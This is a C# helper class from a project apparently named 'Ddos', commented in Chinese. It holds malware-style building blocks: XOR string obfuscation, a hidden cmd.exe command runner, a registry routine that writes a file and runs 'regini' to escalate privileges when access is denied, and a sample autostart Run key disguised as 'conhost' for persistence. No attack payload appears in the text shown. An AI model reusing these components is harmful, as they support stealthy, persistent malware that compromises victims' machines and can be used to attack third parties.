using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Text.RegularExpressions;

namespace Ddos
{
    class Helper
    {
        [DllImport("wininet")]
        private extern static bool InternetGetConnectedState(out int connectionDescription, int reservedValue);

        /// <summary>
        /// 检测本机是否联网
        /// </summary>
        /// <returns>已联网返回真</returns>
        public bool IsConnectedInternet()
        {
            int i = 0;
            if (InternetGetConnectedState(out i, 0))
            {
                //已联网
                return true;
            }
            else
            {
                //未联网
                return false;
            }

        }

        /// <summary>
        /// 用给定的KDC密钥异或加密(解密同样可以用此方法)
        /// </summary>
        /// <param name="bytes">待加密的字节集</param>
        /// <param name="KDC">加密密钥</param>
        /// <returns>返回加密后的字节集</returns>
        public byte[] EncodeOrDecode(byte[] bytes, int KDC)
        {

            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = (byte)(bytes[i] ^ KDC);
            }

            return bytes;
        }

        /// <summary>
        /// 加密字符串位异或后的十进制字符串
        /// </summary>
        /// <param name="strToEncode">待加密的字符串</param>
        /// <param name="KDC">加密密钥</param>
        /// <returns>返回加密后的字符串</returns>
        public string EncodeString(string strToEncode, int KDC)
        {
            byte[] bytesStrToEncode = Encoding.UTF8.GetBytes(strToEncode);
            byte[] encodedBytesStrToEncode = this.EncodeOrDecode(bytesStrToEncode, KDC);
            StringBuilder sb = new StringBuilder();
            foreach (byte b in encodedBytesStrToEncode)
            {
                sb.AppendFormat("{0:D3}", b);
            }
            return sb.ToString();
        }

        /// <summary>
        /// 解密字符串（对应上面的加密）
        /// </summary>
        /// <param name="strToDecode">待解密的字符串</param>
        /// <param name="KDC">解密密钥</param>
        /// <returns>返回解密后的字符串</returns>
        public string DecodeString(string strToDecode, int KDC)
        {
            MatchCollection matches = Regex.Matches(strToDecode, @"\d{3}");
            byte[] bytes = new byte[matches.Count];
            for (int i = 0; i < matches.Count; i++)
            {
                bytes[i] = (byte)(byte.Parse(matches[i].Value) ^ KDC);
            }
            return Encoding.UTF8.GetString(bytes);
        }

        /// <summary>
        /// 创建子键项的方法
        /// </summary>
        /// <param name="subkey">格式为“HKEY_CURRENT_CONFIG\Software\pefish”</param>
        /// <returns>成功返回RegistryKey实例，子键已经存在返回此实例，失败返回null</returns>
        public RegistryKey CreateSubKey(string subkey)
        {
            string[] nodes = subkey.Split(new char[] { '\\' });
            string a = nodes[0] + "\\";
            try
            {
                //循环检测子键是否存在，若不存在则创建
                for (int i = 1; i < nodes.Length; i++)
                {
                    if (GetInstance(a + nodes[i]) == null)
                    {
                        RegistryKey registryKey = GetInstance(a.Substring(0, a.Length - 1));
                        registryKey.CreateSubKey(nodes[i]);
                    }
                    a += nodes[i] + "\\";
                }
                return GetInstance(subkey);
            }
            catch (Exception)
            {
                return null;
            }
        }

        /// <summary>
        /// 根据注册表某结点全名称返回对应RegistryKey子健项实例
        /// </summary>
        /// <param name="subkey"></param>
        /// <returns>子键项不存在时返回空</returns>
        public RegistryKey GetInstance(string subkey)
        {
            string[] node = subkey.Split(new char[] { '\\' });
            RegistryKey classroot = null;
            switch (node[0])
            {
                case "HKEY_CLASSES_ROOT":
                    classroot = Registry.ClassesRoot;
                    break;
                case "HKEY_CURRENT_CONFIG":
                    classroot = Registry.CurrentConfig;
                    break;
                case "HKEY_CURRENT_USER":
                    classroot = Registry.CurrentUser;
                    break;
                case "HKEY_LOCAL_MACHINE":
                    classroot = Registry.LocalMachine;
                    break;
                case "HKEY_USERS":
                    classroot = Registry.Users;
                    break;
            }
            RegistryKey registryKey = classroot;
            for (int i = 1; i < node.Length; i++)
            {
                try
                {
                    registryKey = registryKey.OpenSubKey(node[i], true); //无访问权时会引发异常
                }
                catch (SecurityException) //捕捉特定异常
                {
                    //利用regini命令提权
                    StreamWriter sw = new StreamWriter(@"C:/1.ini");
                    sw.WriteLine(subkey + @" [1]");
                    sw.Close();

                    this.ExeCmd(@"regini C:/1.ini");
                    File.Delete(@"C:/1.ini");

                    registryKey = registryKey.OpenSubKey(node[i], true);
                }

            }
            return registryKey;
        }


        /// <summary>
        /// 执行cmd命令,并等待执行完成返回结果（可以利用线程实现异步，但不会脱离主程序）
        /// </summary>
        /// <param name="cmd">cmd命令,如“ipconfig”</param>
        /// <returns>返回命令执行结果</returns>
        public string ExeCmd(string cmd)
        {
            Process p = new Process();
            //初始化start方法的属性
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/C " + cmd;
            p.StartInfo.UseShellExecute = false;//重定向前必须设置,否则无法达到隐藏窗口的效果
            p.StartInfo.RedirectStandardInput = false;//重定向
            p.StartInfo.RedirectStandardOutput = true;//重定向
            p.StartInfo.CreateNoWindow = true;//不显示窗口
            //启动进程
            p.Start();
            string strOutput = p.StandardOutput.ReadToEnd();//获取输出信息
            p.WaitForExit(500);//等待进程退出
            p.Close();//释放资源
            return strOutput;
        }

        /// <summary>
        /// 创建键值对的方法
        /// </summary>
        /// <param name="keyvaluename">格式为“子键项：键名”，如“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run:conhost”</param>
        /// <param name="value">键值</param>
        /// <param name="type">键值类型。0为Binary，1为DWord，2为ExpandString，3为MultiString，4为QWord，5为String</param>
        /// <returns>成功返回真，失败返回假</returns>
        public void CreateKeyValue(string keyvaluename, object value, int type)
        {
            string[] split = keyvaluename.Split(new char[] { ':' });
            try
            {
                RegistryKey registryKey = CreateSubKey(split[0]);
                switch (type)
                {
                    case 0:
                        //new byte[] {10, 43, 44, 45, 14, 255}
                        registryKey.SetValue(split[1], value, RegistryValueKind.Binary);
                        break;
                    case 1:
                        //42
                        registryKey.SetValue(split[1], value, RegistryValueKind.DWord);
                        break;
                    case 2:
                        //"The path is %PATH%"
                        registryKey.SetValue(split[1], value, RegistryValueKind.ExpandString);
                        break;
                    case 3:
                        //new string[] {"One", "Two", "Three"}
                        registryKey.SetValue(split[1], value, RegistryValueKind.MultiString);
                        break;
                    case 4:
                        //42
                        registryKey.SetValue(split[1], value, RegistryValueKind.QWord);
                        break;
                    case 5:
                        //"The path is %PATH%"
                        registryKey.SetValue(split[1], value, RegistryValueKind.String);
                        break;
                }
            }
            catch (Exception)
            {
                throw;
            }
        }

        /// <summary>
        /// 根据健名获取键值
        /// </summary>
        /// <param name="keyName">格式为“子键项：健名”,如“HKEY_CURRENT_CONFIG\Software\pefish:Isvoice”</param>
        /// <returns>子键项不存在或键值不存在都是返回null</returns>
        public object GetKeyValue(string keyName)
        {
            string[] substring = keyName.Split(new char[] { ':' });

            RegistryKey registryKey = GetInstance(substring[0]);
            if (registryKey != null)
            {
                return registryKey.GetValue(substring[1]);
            }
            else
            {
                return null;
            }
        }

    }
}
